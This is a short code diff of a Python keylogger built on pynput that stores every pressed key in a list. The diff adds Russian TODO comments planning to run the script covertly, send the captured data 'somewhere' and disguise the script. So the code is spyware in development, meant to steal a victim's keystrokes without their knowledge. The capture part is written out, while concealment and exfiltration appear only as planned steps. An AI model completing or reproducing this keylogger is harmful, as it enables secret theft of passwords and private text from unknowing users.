@@ -5,7 +5,6 @@ from pynput.keyboard import Key, Listener
 
 pressedkeys = []
 
-
 def on_press(key):
     try:
         pressedkeys.append(key.char)
@@ -24,8 +23,9 @@ def on_release(key):
     if key == keyboard.Key.esc:
         return False
     # изменить точку остановки
-
-
+    # скрытая работа, запуск
+    # отправка данных куда-то
+    # сделать скрипт замаскированным или чет такого
 with keyboard.Listener(
         on_press=on_press,
         on_release=on_release) as listener:
